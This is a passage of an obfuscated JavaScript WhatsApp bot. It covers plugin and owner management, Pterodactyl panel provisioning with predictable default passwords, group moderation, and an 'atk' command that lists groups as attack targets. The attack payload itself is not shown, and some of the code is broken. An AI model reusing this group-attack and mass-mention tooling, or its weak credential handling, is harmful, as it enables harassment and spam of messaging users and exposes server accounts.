            await _0x143f2f("Plugin dengan command '" + _0x1f8f56 + "' tidak ditemukan");
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "rmplug":
          {
            if (!_0x1b50e2) {
              return;
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            if (!q) {
              return _0x143f2f("Please provide the command name of the plugin you want to remove. Example: \n\n*.rmplug thisplug*");
            }
            let _0x350ad2 = path.resolve(__dirname, "./plugin");
            let _0x323e69 = _0x2fe66c(_0x350ad2);
            for (const _0x147af3 of _0x323e69) {
              if (_0x147af3.command.includes(q)) {
                let _0x114afa = _0x147af3.filePath;
                fs.unlinkSync(_0x114afa);
                await _0x143f2f("Plugin di " + _0x114afa + " telah dihapus.");
                return;
              }
            }
            await _0x143f2f("Plugin dengan command '" + q + "' tidak ditemukan.");
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "getplug":
          {
            if (!_0x1b50e2) {
              return;
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            if (!q) {
              return _0x143f2f("Add Input, Example: \n\n*.getplug ryocakep*");
            }
            let _0x45b871 = path.resolve(__dirname, './plugin');
            let _0x57c4f9 = _0x2fe66c(_0x45b871).find(_0x3d18ec => _0x3d18ec.command.includes(q));
            if (!_0x57c4f9) {
              return _0x143f2f("Plugin dengan command '" + q + "' tidak ditemukan.");
            }
            await _0x212ab4.sendMessage(_0x43016e.chat, {
              'document': fs.readFileSync(_0x57c4f9.filePath),
              'fileName': path.basename(_0x57c4f9.filePath),
              'mimetype': "*/*"
            }, {
              'quoted': _0x43016e
            });
            await _0x143f2f("Succes mengambil plugin '" + q + "', plugin telah dikirim.");
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'delowner':
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("Penggunaan ." + _0x32b9e9 + " 6287392784527");
            }
            let _0x5db21a = q.replace(/[^0-9]/g, '');
            if (_0x5db21a.startsWith('0')) {
              return _0x143f2f("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x32b9e9 + " 6287392784527");
            }
            let _0x59209c = _0x42bab9.indexOf(_0x5db21a);
            if (_0x59209c > -0x1) {
              _0x42bab9.splice(_0x59209c, 0x1);
              fs.writeFileSync(path.resolve(__dirname, '../trashbase/dtbs/owner.json'), JSON.stringify(_0x42bab9), 'utf8');
              _0x143f2f("Owner berhasil dihapus");
            } else {
              _0x143f2f("Nomor tidak ditemukan dalam daftar owner");
            }
          }
          break;
        case 'delprem':
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("Penggunaan ." + _0x32b9e9 + " 6287392784527");
            }
            let _0x2b315b = q.replace(/[^0-9]/g, '');
            if (_0x2b315b.startsWith('0')) {
              return _0x143f2f("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x32b9e9 + " 6287392784527");
            }
            let _0x252686 = _0x31fc27.indexOf(_0x2b315b);
            if (_0x252686 > -0x1) {
              _0x31fc27.splice(_0x252686, 0x1);
              fs.writeFileSync(path.resolve(__dirname, '../trashbase/dtbs/premium.json'), JSON.stringify(_0x31fc27), "utf8");
              _0x143f2f("Pengguna premium berhasil dihapus");
            } else {
              _0x143f2f("Nomor tidak ditemukan dalam daftar pengguna premium");
            }
          }
          break;
        case "addowner":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("Penggunaan ." + _0x32b9e9 + " 6287392784527");
            }
            let _0x26525c = q.replace(/[^0-9]/g, '');
            if (_0x26525c.startsWith('0')) {
              return _0x143f2f("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x32b9e9 + " 6287392784527");
            }
            let _0x494935 = _0x26525c + "@s.whatsapp.net";
            _0x42bab9.push(_0x26525c);
            fs.writeFileSync(path.resolve(__dirname, '../trashbase/dtbs/owner.json'), JSON.stringify(_0x42bab9), "utf8");
            _0x143f2f("Berhasil menambahkan ke daftar owner");
            await _0x1c5f51(0x1388);
            await _0x212ab4.sendMessage(_0x494935, {
              'contextInfo': {
                'mentionedJid': [_0x494935],
                'externalAdReply': {
                  'showAdAttribution': false,
                  'renderLargerThumbnail': false,
                  'title': "# Addprem - " + _0x494935,
                  'previewType': 'VIDEO',
                  'sourceUrl': '' + global.url,
                  'mediaUrl': '' + global.url
                }
              },
              'text': "\nAnda kini telah mendapatkan akses owner ke bot\n"
            }, {
              'quoted': _0x43016e
            });
          }
          break;
        case "addprem":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("Penggunaan ." + _0x32b9e9 + " 6287392784527");
            }
            let _0xf784a1 = q.replace(/[^0-9]/g, '');
            if (_0xf784a1.startsWith('0')) {
              return _0x143f2f("<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : ." + _0x32b9e9 + " 6287392784527");
            }
            let _0xcda14d = _0xf784a1 + "@s.whatsapp.net";
            _0x31fc27.push(_0xf784a1);
            fs.writeFileSync(path.resolve(__dirname, "../trashbase/dtbs/premium.json"), JSON.stringify(_0x31fc27), "utf8");
            _0x143f2f("Berhasil menambahkan ke daftar premium");
            await _0x1c5f51(0x1388);
            await _0x212ab4.sendMessage(_0xcda14d, {
              'contextInfo': {
                'mentionedJid': [_0xcda14d],
                'externalAdReply': {
                  'showAdAttribution': false,
                  'renderLargerThumbnail': false,
                  'title': "# Addprem - " + _0xcda14d,
                  'previewType': "VIDEO",
                  'sourceUrl': '' + global.url,
                  'mediaUrl': '' + global.url
                }
              },
              'text': "\nAnda kini telah mendapatkan akses premium ke bot\n"
            }, {
              'quoted': _0x43016e
            });
          }
          break;
        case "ping":
          {
            const _0x413801 = new Date();
            const _0x1b907f = await _0x212ab4.sendMessage(_0x43016e.chat, {
              'text': "*H3PT0S*"
            });
            await _0x212ab4.relayMessage(_0x43016e.chat, {
              'protocolMessage': {
                'key': _0x1b907f.key,
                'type': 0xe,
                'editedMessage': {
                  'conversation': "H3PT0S 9 ping is ➟ *" + (new Date() - _0x413801) + "* ᴍs "
                }
              }
            }, {});
          }
          break;
        case "runtime":
        case "alive":
          let _0x23c883 = "H3PT0S 9 bot ɦαร ɓεεɳ αcƭเѵε ƒσɾ " + _0x514e28(process.uptime());
          _0x212ab4.sendMessage(_0x43016e.chat, {
            'text': _0x23c883,
            'contextInfo': {
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "YouTube H3PT0S God",
                'body': "H3PT0S God Sir",
                'thumbnailUrl': "https://i.ibb.co/5hYWrRH/thumb.png",
                'sourceUrl': "https://whatsapp.com/channel/0029VahKfXr8aKvG3ctVjG1z",
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x43016e
          });
          break;
        case "addsrv":
          {
            if (!_0x1b50e2) {
              return _0x143f2f("You are not my owner");
            }
            let _0x389fad = _0x1e24da.split(',');
            if (_0x389fad.length < 0x7) {
              return reply("> *Incorrect format!*\n\n❗ Usage:\n" + (_0x3219ab + _0x32b9e9) + " panel name, date, user ID you want to add the server to, eggId, locationId, memory/disk, cpu\n\n`✅ Example` : addsrv Spider,26 December 2018,1,15,1,0/0,0\n");
            }
            let _0x315317 = _0x389fad[0x0];
            let _0x4b9b03 = _0x389fad[0x2];
            let _0x2a94b0 = _0x389fad[0x3];
            let _0x3d1e9e = _0x389fad[0x4];
            let _0x10dce8 = _0x389fad[0x5].split`/`;
            let _0x10778d = _0x389fad[0x6];
            let _0x45d6db = await fetch(domain + "/api/application/nests/5/eggs/" + _0x2a94b0, {
              'method': "GET",
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              }
            });
            let _0x1bde1a = await _0x45d6db.json();
            let _0x54a46a = _0x1bde1a.attributes.startup;
            let _0x3b3c2e = await fetch(domain + '/api/application/servers', {
              'method': "POST",
              'headers': {
                'Accept': 'application/json',
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              },
              'body': JSON.stringify({
                'name': _0x315317 + " King-Sam",
                'description': "Created by " + namabot,
                'user': _0x4b9b03,
                'egg': parseInt(_0x2a94b0),
                'docker_image': "ghcr.io/parkervcp/yolks:nodejs_19",
                'startup': _0x54a46a,
                'environment': {
                  'INST': 'npm',
                  'USER_UPLOAD': '0',
                  'AUTO_UPDATE': '0',
                  'CMD_RUN': "npm start"
                },
                'limits': {
                  'memory': _0x10dce8[0x0],
                  'swap': 0x0,
                  'disk': _0x10dce8[0x1],
                  'io': 0x1f4,
                  'cpu': _0x10778d
                },
                'feature_limits': {
                  'databases': 0x5,
                  'backups': 0x5,
                  'allocations': 0x5
                },
                'deploy': {
                  'locations': [parseInt(_0x3d1e9e)],
                  'dedicated_ip': false,
                  'port_range': []
                }
              })
            });
            let _0x3b175b = await _0x3b3c2e.json();
            if (_0x3b175b.errors) {
              return reply(JSON.stringify(_0x3b175b.errors[0x0], null, 0x2));
            }
            let _0x10df6f = _0x3b175b.attributes;
            _0x143f2f("\n❗ *SUCCESSFULLY ADD SERVER*\n\nTYPE: `" + _0x3b175b.object + "`\n\nID: `" + _0x10df6f.id + "`\nUUID: " + _0x10df6f.uuid + "`\nNAME: " + _0x10df6f.name + "`\nDESCRIPTION: `" + _0x10df6f.description + "`\nMEMORY: `" + (_0x10df6f.limits.memory === 0x0 ? "Unlimited" : _0x10df6f.limits.memory) + " MB`\nDISK: `" + (_0x10df6f.limits.disk === 0x0 ? 'Unlimited' : _0x10df6f.limits.disk) + " MB`\nCPU: `" + _0x10df6f.limits.cpu + "%`\nCREATED AT: " + _0x10df6f.created_at + '`');
          }
          break;
        case "unli":
          {
            if (!_0x1b50e2) {
              return _0x143f2f("You cannot get a panel because u are not my owner gay 💀");
            }
            let _0x230fae = _0x1e24da.split(',');
            if (_0x230fae.length < 0x2) {
              return reply("use:\n" + (_0x3219ab + _0x32b9e9) + " user,number");
            }
            let _0x46968b = _0x230fae[0x0];
            let _0x3ff26c = _0x43016e.quoted ? _0x43016e.quoted.sender : _0x230fae[0x1] ? _0x230fae[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x43016e.mentionedJid[0x0];
            let _0xf6e644 = global.eggsnya;
            let _0x443dbd = global.location;
            let _0x3f1fd6 = _0x46968b + "kingsam@sweetrabit.ml";
            akunlo = "https://telegra.ph/file/3879ada0f622f5843b662.jpg";
            if (!_0x3ff26c) {
              return;
            }
            let _0x45b19d = _0x46968b + "001";
            let _0x1e172e = await fetch(domain + "/api/application/users", {
              'method': "POST",
              'headers': {
                'Accept': 'application/json',
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              },
              'body': JSON.stringify({
                'email': _0x3f1fd6,
                'username': _0x46968b,
                'first_name': _0x46968b,
                'last_name': _0x46968b,
                'language': 'en',
                'password': _0x45b19d
              })
            });
            let _0x389531 = await _0x1e172e.json();
            if (_0x389531.errors) {
              return _0x143f2f(JSON.stringify(_0x389531.errors[0x0], null, 0x2));
            }
            let _0x51c578 = _0x389531.attributes;
            let _0x4a285f = await fetch(domain + "/api/application/nests/5/eggs/" + _0xf6e644, {
              'method': 'GET',
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              }
            });
            _0x143f2f("User ID: " + _0x51c578.id);
            let _0x4ac7df = "❗Hello @" + _0x43016e.sender.split('@')[0x0] + " , 𝕶𝖎𝖓𝖌 𝕾𝖆𝖒 Just Gave You Access To The Following Account Panel > >\n\n👤 Username: " + _0x51c578.username + "\n🔐 Password: " + _0x45b19d + "\n🔗 Url: " + domain;
            _0x212ab4.sendMessage(_0x3ff26c, {
              'image': {
                'url': "https://telegra.ph/file/7f1e9da89011736a82473.jpg"
              },
              'caption': _0x4ac7df
            }, {
              'quoted': _0x43016e
            });
            let _0x149d4d = await _0x4a285f.json();
            let _0x300197 = _0x149d4d.attributes.startup;
            let _0x12982c = await fetch(domain + "/api/application/servers", {
              'method': "POST",
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              },
              'body': JSON.stringify({
                'name': _0x46968b + " - Unlimited",
                'description': "Create with " + namabot,
                'user': _0x51c578.id,
                'egg': parseInt(_0xf6e644),
                'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
                'startup': _0x300197,
                'environment': {
                  'INST': "npm",
                  'USER_UPLOAD': '0',
                  'AUTO_UPDATE': '0',
                  'CMD_RUN': "npm start"
                },
                'limits': {
                  'memory': '0',
                  'swap': 0x0,
                  'disk': '0',
                  'io': 0x1f4,
                  'cpu': '0'
                },
                'feature_limits': {
                  'databases': 0x5,
                  'backups': 0x5,
                  'allocations': 0x5
                },
                'deploy': {
                  'locations': [parseInt(_0x443dbd)],
                  'dedicated_ip': false,
                  'port_range': []
                }
              })
            });
            let _0xf8279a = await _0x12982c.json();
            if (_0xf8279a.errors) {
              return reply(JSON.stringify(_0xf8279a.errors[0x0], null, 0x2));
            }
          }
          break;
        case "2gb":
          {
            if (!_0x1b50e2) {
              reply("You are not my owner");
            }
            if (!_0x1b50e2) {
              return reply(mess.owner);
            }
            let _0x30f4ab = _0x1e24da.split(',');
            if (_0x30f4ab.length < 0x2) {
              return reply("Format salah!\nPenggunaan:\n" + (_0x3219ab + _0x32b9e9) + " user,nomer");
            }
            let _0x444d0f = _0x30f4ab[0x0];
            let _0x5e07a7 = _0x43016e.quoted ? _0x43016e.quoted.sender : _0x30f4ab[0x1] ? _0x30f4ab[0x1].replace(/[^0-9]/g, '') + "@s.whatsapp.net" : _0x43016e.mentionedJid[0x0];
            let _0x3594ab = global.eggsnya;
            let _0x3b7b08 = global.location;
            let _0x49b32b = _0x444d0f + "@sweetrabit.ml";
            akunlo = "https://telegra.ph/file/5dee118c168b867344987.jpg";
            if (!_0x5e07a7) {
              return;
            }
            let _0x39094f = _0x444d0f + "001";
            let _0x1f077a = await fetch(domain + "/api/application/users", {
              'method': "POST",
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              },
              'body': JSON.stringify({
                'email': _0x49b32b,
                'username': _0x444d0f,
                'first_name': _0x444d0f,
                'last_name': _0x444d0f,
                'language': 'en',
                'password': _0x39094f
              })
            });
            let _0x2f870a = await _0x1f077a.json();
            if (_0x2f870a.errors) {
              return reply(JSON.stringify(_0x2f870a.errors[0x0], null, 0x2));
            }
            let _0x906783 = _0x2f870a.attributes;
            let _0x56a098 = await fetch(domain + "/api/application/nests/5/eggs/" + _0x3594ab, {
              'method': "GET",
              'headers': {
                'Accept': "application/json",
                'Content-Type': "application/json",
                'Authorization': "Bearer " + apikey
              }
            });
            _0x143f2f("User ID: " + _0x906783.id);
            let _0x5e23a1 = "❗Hello @" + _0x43016e.sender.split('@')[0x0] + " , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >\n\n👤 Username: " + _0x906783.username + "\n🔐 Password: " + _0x39094f + "\n🔗 Url: " + domain;
            _0x212ab4.sendMessage(_0x5e07a7, {
              'image': {
                'url': "https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg"
              },
              'caption': _0x5e23a1
            }, {
              'quoted': _0x43016e
            });
            let _0x7425a7 = await _0x56a098.json();
            let _0x172659 = _0x7425a7.attributes.startup;
            let _0x416b14 = await fetch(domain + "/api/application/servers", {
              'method': 'POST',
              'headers': {
                'Accept': "application/json",
                'Content-Type': 'application/json',
                'Authorization': "Bearer " + apikey
              },
              'body': JSON.stringify({
                'name': _0x444d0f + " - 2gb",
                'description': "Create with " + namabot,
                'user': _0x906783.id,
                'egg': parseInt(_0x3594ab),
                'docker_image': "ghcr.io/parkervcp/yolks:nodejs_18",
                'startup': _0x172659,
                'environment': {
                  'INST': 'npm',
                  'USER_UPLOAD': '0',
                  'AUTO_UPDATE': '0',
                  'CMD_RUN': "npm start"
                },
                'limits': {
                  'memory': "2024",
                  'swap': 0x0,
                  'disk': '2024',
                  'io': 0x1f4,
                  'cpu': '70'
                },
                'feature_limits': {
                  'databases': 0x5,
                  'backups': 0x5,
                  'allocations': 0x5
                },
                'deploy': {
                  'locations': [parseInt(_0x3b7b08)],
                  'dedicated_ip': false,
                  'port_range': []
                }
              })
            });
            let _0x303f26 = await _0x416b14.json();
            if (_0x303f26.errors) {
              return reply(JSON.stringify(_0x303f26.errors[0x0], null, 0x2));
            }
          }
          break;
        case "join":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!_0x1e24da) {
              return _0x143f2f("Masukkan Link Group!");
            }
            if (!_0xf31bb5(_0x6852f1[0x0]) && !_0x6852f1[0x0].includes("whatsapp.com")) {
              return "Link Invalid!";
            }
            _0x143f2f(mess.wait);
            let _0x5ee47a = _0x6852f1[0x0].split("https://chat.whatsapp.com/")[0x1];
            await _0x212ab4.groupAcceptInvite(_0x5ee47a).then(_0x1f0084 => _0x143f2f(_0xacd83b(_0x1f0084)))["catch"](_0x5f22aa => _0x143f2f(_0xacd83b(_0x5f22aa)));
          }
          break;
        case "block":
          {
            if (!_0x1b50e2) {
              return;
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x5b88ce = _0x43016e.mentionedJid[0x0] ? _0x43016e.mentionedJid[0x0] : _0x43016e.quoted ? _0x43016e.quoted.sender : _0x1e24da.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            _0x5b88ce = _0x5b88ce || _0x43016e.chat;
            if (_0x5b88ce.includes('@g.us')) {
              return _0x143f2f("Loh, @g.us ? 🧐");
            }
            await _0x212ab4.updateBlockStatus(_0x5b88ce, "block").then(_0x1a11b9 => _0x143f2f(_0xacd83b(_0x1a11b9)))["catch"](_0x16da46 => _0x143f2f(_0xacd83b(_0x16da46)));
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "unblock":
          if (!_0x1b50e2) {
            return;
          }
          let _0x5cb7fd = _0x43016e.quoted ? _0x43016e.quoted.sender : _0x1e24da.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          if (_0x63587c) {
            if (_0x5cb7fd) {
              await _0x212ab4.updateBlockStatus(_0x5cb7fd, "unblock");
              await _0x143f2f("Sukses unblock user");
            } else if (!q) {
              _0x143f2f("Silakan reply pesan atau tag atau input nomer yang mau di block");
            }
          } else {
            if (!_0x63587c) {
              if (q) {
                let _0x2fb38e = q.replace(new RegExp("[()+-/ +/]", 'gi'), '') + '@s.whatsapp.net';
                if (_0x2fb38e.startsWith('08')) {
                  return _0x143f2f("Awali nomer dengan 62");
                }
                if (!_0x2fb38e.startsWith('62')) {
                  return _0x143f2f("Silakan reply pesan atau tag atau input nomer yang mau di block");
                }
                await _0x212ab4.updateBlockStatus(_0x2fb38e, "unblock");
                _0x143f2f("Sukses unblock " + _0x2fb38e);
              } else if (!q) {
                _0x143f2f("Masukan nomer yang ingin di unblock");
              }
            }
          }
          break;
        case "listblock":
          {
            let _0x30e50c = await _0x212ab4.fetchBlocklist();
            _0x143f2f("List Block :\n\n" + ("Total : " + (_0x30e50c == undefined ? "*0* Diblokir" : '*' + _0x30e50c.length + "* Diblokir") + "\n") + _0x30e50c.map(_0x2ef2b1 => "• " + _0x2ef2b1.replace(/@.+/, '')).join`\n`);
          }
          break;
        case 'setppbot':
          {
            if (!_0x1b50e2) {
              return;
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            if (_0x43016e.quoted) {
              const _0x3f3951 = await _0x212ab4.downloadAndSaveMediaMessage(_0x55b1ec);
              const {
                img: _0x1ad1c9
              } = await _0x711609(_0x3f3951);
              await _0x212ab4.query({
                'tag': 'iq',
                'attrs': {
                  'to': _0x867a51,
                  'type': 'set',
                  'xmlns': 'w:profile:picture'
                },
                'content': [{
                  'tag': 'picture',
                  'attrs': {
                    'type': "image"
                  },
                  'content': _0x1ad1c9
                }]
              });
              await _0x143f2f('' + mess.success);
              await _0x7c0daa(_0x43016e.chat, '✅');
            } else {
              _0x143f2f("Reply pic");
            }
          }
          break;
        case 'delppbot':
          {
            if (!_0x1b50e2) {
              return;
            }
            _0x212ab4.removeProfilePicture(_0x212ab4.user.id);
            _0x143f2f(mess.succes);
          }
          break;
        case "setbiobot":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("example " + (_0x3219ab + _0x32b9e9) + " your bio text");
            }
            await _0x212ab4.updateProfileStatus(q);
            await _0x143f2f("new whatsapp about is *" + q + '*');
          }
          break;
        case "leavegc":
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!_0x63587c) {
              return;
            }
            await _0x212ab4.groupLeave(_0x43016e.chat);
          }
          break;
        case 'setppgroup':
        case "setppgrup":
        case "setppgc":
          {
            if (!_0x1b50e2) {
              return _0x143f2f(mess.usingsetpp);
            }
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            if (!_0x3cef78) {
              return _0x143f2f(mess.admin);
            }
            if (!/image/.test(_0x35d9cf)) {
              return _0x143f2f("Kirim/Reply Image Dengan Caption " + (_0x3219ab + _0x32b9e9));
            }
            if (/webp/.test(_0x35d9cf)) {
              return _0x143f2f("Kirim/Reply Image Dengan Caption " + (_0x3219ab + _0x32b9e9));
            }
            let _0x199122 = await _0x212ab4.downloadAndSaveMediaMessage(_0x43016e);
            await _0x212ab4.updateProfilePicture(_0x43016e.chat, {
              'url': _0x199122
            })['catch'](_0x4860de => fs.unlinkSync(_0x199122));
            _0x143f2f('done');
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "editsubjek":
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!q) {
              return _0x143f2f("Example *" + (_0x3219ab + _0x32b9e9) + " penis*");
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            await _0x212ab4.groupUpdateSubject(_0x43016e.chat, _0x1e24da);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'editdesk':
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!q) {
              return _0x143f2f("Example *" + (_0x3219ab + _0x32b9e9) + " penis*");
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            await _0x212ab4.groupUpdateDescription(_0x43016e.chat, _0x1e24da);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'linkgroup':
        case "linkgc":
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x354f4b = await _0x212ab4.groupInviteCode(_0x43016e.chat);
            _0x212ab4.sendText(_0x43016e.chat, "https://chat.whatsapp.com/" + _0x354f4b + "\n\nLink Group : " + _0x3c927d.subject, _0x43016e, {
              'detectLink': true
            });
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "resetlinkgc":
        case "revoke":
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            _0x212ab4.groupRevokeInvite(_0x43016e.chat);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "linkgc":
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x2a2f9e = await _0x212ab4.groupInviteCode(_0x43016e.chat);
            _0x143f2f("https://chat.whatsapp.com/" + _0x2a2f9e + "\n\nLink Group : " + _0x3c927d.subject);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'kick':
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!_0x3cef78) {
              return _0x143f2f(mess.admin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x5db44c = _0x43016e.mentionedJid[0x0] ? _0x43016e.mentionedJid[0x0] : _0x43016e.quoted ? _0x43016e.quoted.sender : _0x1e24da.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
            await _0x212ab4.groupParticipantsUpdate(_0x43016e.chat, [_0x5db44c], 'remove');
            _0x143f2f(mess.done);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "add":
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!_0x3cef78) {
              return _0x143f2f(mess.admin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x206626 = _0x43016e.quoted ? _0x43016e.quoted.sender : _0x1e24da.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await _0x212ab4.groupParticipantsUpdate(_0x43016e.chat, [_0x206626], "add");
            _0x143f2f(mess.done);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "promote":
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!_0x3cef78) {
              return _0x143f2f(mess.admin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x282549 = _0x43016e.mentionedJid[0x0] ? _0x43016e.mentionedJid[0x0] : _0x43016e.quoted ? _0x43016e.quoted.sender : _0x1e24da.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await _0x212ab4.groupParticipantsUpdate(_0x43016e.chat, [_0x282549], "promote");
            _0x143f2f(mess.done);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'demote':
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!_0x3cef78) {
              return _0x143f2f(mess.admin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x3850a2 = _0x43016e.mentionedJid[0x0] ? _0x43016e.mentionedJid[0x0] : _0x43016e.quoted ? _0x43016e.quoted.sender : _0x1e24da.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
            await _0x212ab4.groupParticipantsUpdate(_0x43016e.chat, [_0x3850a2], "demote");
            _0x143f2f(mess.done);
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'hidetag':
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x164b78) {
              return _0x143f2f(mess.notadmin);
            }
            if (!_0x1b50e2) {
              return _0x143f2f(mess.admin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            _0x212ab4.sendMessage(_0x43016e.chat, {
              'text': q ? q : '',
              'mentions': _0xa9dd5d.map(_0x2467e1 => _0x2467e1.id)
            }, {
              'quoted': _0x43016e
            });
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case 'tagall':
          {
            if (!_0x63587c) {
              return _0x143f2f(mess.ingroup);
            }
            if (!_0x1b50e2) {
              return _0x143f2f(mess.admin);
            }
            await _0x7c0daa(_0x43016e.chat, '🔁');
            let _0x30fc04 = "─── ▻ [ *Tag All* ] ◅ ───\n\n ⬡ *H3PT0S : " + (q ? q : 'God') + "*\n\n";
            for (let _0x44ab53 of _0xa9dd5d) {
              _0x30fc04 += "▢ @" + _0x44ab53.id.split[0x0] + "\n";
            }
            _0x212ab4.sendMessage(_0x43016e.chat, {
              'text': _0x30fc04,
              'mentions': _0xa9dd5d.map(_0x24c90d => _0x24c90d.id)
            }, {
              'quoted': _0x43016e
            });
            await _0x7c0daa(_0x43016e.chat, '✅');
          }
          break;
        case "atk":
          {
            if (!_0x1b50e2) {
              return;
            }
            let _0x1b31aa = await prepareWAMessageMedia({
              'image': _0x5aa301
            }, {
              'upload': _0x212ab4.waUploadToServer
            });
            let _0x2668a0 = Object.values(await _0x212ab4.groupFetchAllParticipating()['catch'](_0x160ba8 => null));
            let _0x12ebfc = [];
            await _0x2668a0.forEach((_0x37bdac, _0x5ad42d) => {
              let _0x1ecbd8 = {
                'header': _0x37bdac.subject,
                'title': "Attack Group | Status - ( " + (_0x37bdac.announce == true ? "Group Closed" : "Group Open") + " )",
                'id': ".getview " + _0x37bdac.id
              };
              _0x12ebfc.push(_0x1ecbd8);
            });
            var _0x288780 = generateWAMessageFromContent(_0x43016e.chat, proto.Message.fromObject({
              'viewOnceMessage': {
                'message': {
                  'interactiveMessage': {
                    'header': {
                      ..._0x1b31aa,
                      'hasMediaAttachment': true
                    },
                    'body': {
                      'text': "  - # Powered by *H3PT0S God Sir* 🏴‍☠️"
                    },
                    'footer': {
                      'text': "! love you 😘 💕😘🥵"
                    },
                    'nativeFlowMessage': {
                      'buttons': [{
                        'name': "single_select",
                        'buttonParamsJson': JSON.stringify({
                          'title': "Select Group💀",
                          'sections': [{
                            'title': "Only Open groups can be Executed",
                            'rows': _0x12ebfc
                          }]
                        })
                      }],
                      'messageParamsJson': ''
                    }
                  }
                }
              }
            }), {
              'userJid': _0x43016e.chat,
              'quoted': _0x43016e
            });
            _0x212ab4.relayMessage(_0x43016e.chat, _0x288780.message, {
              'messageId': _0x288780.key.id
            });
          }
          break;
        case 'pushkontak':
          {
            if (!_0x1b50e2) {
              return;
            }
            if (!q) {
              return _0x143f2f("*Example : " + (_0x3219ab + _0x32b9e9) + " ngab, save ryo*");
            }
